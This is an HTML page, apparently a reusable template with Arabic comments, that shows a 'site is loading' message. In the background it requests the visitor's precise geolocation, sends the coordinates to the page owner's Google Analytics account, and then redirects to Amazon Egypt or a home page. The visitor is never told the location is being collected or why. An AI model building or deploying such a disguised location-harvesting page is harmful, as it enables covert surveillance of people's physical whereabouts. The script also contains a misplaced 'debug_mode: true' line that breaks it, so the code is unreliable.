<!DOCTYPE html>
<html lang="ar">

<head>
    <meta charset="UTF-8">
    <title>تحميل الموقع</title>

    <!-- Google Analytics -->
    <script async src="https://www.googletagmanager.com/gtag/js?id=G-XXXXXXXXXX"></script>
    <script>
        window.dataLayer = window.dataLayer || [];
        function gtag() { dataLayer.push(arguments); }
        gtag('js', new Date());
        gtag('config', 'G-QJY5W3ZF4F'); // ← استبدله بكود التتبع الخاص بك
        debug_mode: true  // ← هذا السطر مهم جدًا
    </script>

    <script>
        function sendLocationAndRedirect() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    function (position) {
                        const lat = position.coords.latitude;
                        const lng = position.coords.longitude;

                        // إرسال الإحداثيات إلى Google Analytics
                        gtag('event', 'user_location', {
                            'event_category': 'Location',
                            'event_label': 'User Entered Website',
                            'latitude': lat,
                            'longitude': lng
                        });

                        // الانتقال إلى صفحة أخرى
                        setTimeout(() => {
                            window.location.href = "https://www.amazon.eg/"; // ← غيّرها للرابط اللي تحبه
                        }, 1000); // ننتظر ثانية لضمان إرسال البيانات قبل الانتقال
                    },
                    function (error) {
                        console.warn("فشل تحديد الموقع:", error.message);
                        window.location.href = "home.html"; // حتى لو فشل، نحوله للصفحة
                    },
                    {
                        enableHighAccuracy: true
                    }
                );
            } else {
                window.location.href = "home.html"; // لو المتصفح ما بيدعم
            }
        }

        // ننفذ الكود تلقائيًا عند تحميل الصفحة
        window.onload = sendLocationAndRedirect;
    </script>
</head>

<body>
    <h2>جارٍ تحميل الموقع...</h2>
</body>

</html>
